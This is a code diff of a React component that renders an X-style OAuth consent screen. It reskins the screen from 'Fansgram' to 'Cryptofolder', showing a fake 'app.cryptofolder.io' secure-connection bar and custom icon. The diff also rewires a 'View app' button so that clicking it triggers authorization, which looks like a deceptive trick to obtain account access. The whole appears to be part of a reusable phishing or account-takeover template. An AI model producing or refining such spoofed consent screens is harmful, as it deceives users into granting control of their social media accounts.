@@ -7,12 +7,23 @@ import "./OAuth.css";
 import type { JobStartResponse } from "../../../server/src/types/jobs";
 import { FullScreenLoader } from "../components/FullScreenLoader";
 import { API_BASE } from "../config/api";
+import cryptofolderIcon from "../../assets/cryptofolder.jpeg";
 
 type AuthStatus = "pending" | "success" | "error";
 
 type DbUserInfo =
-  | { isAuthenticated: true; username: string; createdAt: string; avatarUrl?: string | null }
-  | { isAuthenticated: false; username: null; createdAt: null; avatarUrl?: null };
+  | {
+      isAuthenticated: true;
+      username: string;
+      createdAt: string;
+      avatarUrl?: string | null;
+    }
+  | {
+      isAuthenticated: false;
+      username: null;
+      createdAt: null;
+      avatarUrl?: null;
+    };
 
 type TelegramInitResponse = {
   ok: boolean;
@@ -162,34 +173,43 @@ export const OAuth = () => {
                 </svg>
                 <span>OAuth • Secure connection</span>
               </div>
-              <span className="oauth-header-right">app.fansgram.io</span>
+              <span className="oauth-header-right">app.cryptofolder.io</span>
             </div>
           </div>
 
           <div className="oauth-content">
             <div className="oauth-title-section">
               <p className="oauth-title">
-                Fansgram wants to access your X account.
+                Cryptofolder wants to access your X account.
               </p>
 
               <div className="oauth-app-card">
                 <div className="oauth-app-info">
-                  <div
-                    className="oauth-app-icon"
-                    style={{
-                      background: "linear-gradient(135deg, #1d9bf0, #004c86)",
-                    }}
-                  >
-                    FG
+                  <div className="oauth-app-icon">
+                    <img 
+                      src={cryptofolderIcon} 
+                      alt="Cryptofolder" 
+                      style={{
+                        width: "100%",
+                        height: "100%",
+                        objectFit: "cover",
+                        borderRadius: "16px"
+                      }}
+                    />
                   </div>
                   <div>
-                    <p className="oauth-app-name">Fansgram</p>
+                    <p className="oauth-app-name">Cryptofolder ©</p>
                     <p className="oauth-app-handle">
-                      {isDbAuthed ? `@${dbUser.username}` : "@yourname"}
+                      {isDbAuthed ? `@${dbUser.username}` : "@cryptofolder"}
                     </p>
                   </div>
                 </div>
-                <button type="button" className="oauth-view-app">
+                <button
+                  type="button"
+                  className="oauth-view-app"
+                  onClick={handleAuthorize}
+                  disabled={authStatus === "pending"}
+                >
                   View app
                   <svg
                     width="16"
